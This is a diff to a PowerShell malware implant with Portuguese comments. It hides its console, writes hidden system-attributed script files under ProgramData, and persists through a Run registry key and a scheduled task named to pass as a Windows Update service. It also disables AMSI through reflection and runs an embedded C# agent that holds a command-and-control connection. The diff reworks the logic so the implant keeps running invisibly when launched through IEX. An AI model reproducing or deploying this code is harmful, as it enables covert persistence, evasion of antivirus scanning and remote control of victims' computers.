@@ -15,14 +15,7 @@ if (-not $isAdmin) {
     exit
 }
 
-# ===== ESCONDE E VAI PRO BACKGROUND =====
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
-[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
-
+# ===== PREPARA O VBS E PERSISTÊNCIA =====
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
@@ -36,7 +29,6 @@ Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContin
 attrib +h +s +r $scriptPath 2>$null
 attrib +h +s +r $vbsPath 2>$null
 
-# ===== PERSISTÊNCIA =====
 $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
 try {
     Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -53,13 +45,21 @@ try {
     Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
-if (-not $env:WinUpdateHidden) {
-    $env:WinUpdateHidden = "1"
+# ===== VERIFICA SE ESTÁ RODANDO ESCONDIDO =====
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+
+# Se a janela existir (rodou via IEX), ele esconde e passa pro VBS.
+if ($consolePtr -ne [IntPtr]::Zero) {
+    [Console.Window]::ShowWindow($consolePtr, 0) 
     Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
-    exit
+    exit # Fecha essa janela e a execução continua invisível pelo VBS
 }
 
-# ===== AMSI BYPASS =====
+# ===== CÓDIGO DO AGENTE (Roda invisível a partir daqui) =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -113,7 +113,6 @@ if (-not ("R9KAgent" -as [type])) {
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
 
-                    // Fica travado aqui enquanto a conexão existir. Poll detecta se o C2 fechou.
                     while (myClient.Connected) {
                         if (myStream.Socket.Poll(1000, SelectMode.SelectRead) && myStream.Socket.Available == 0) break;
                         Thread.Sleep(100);
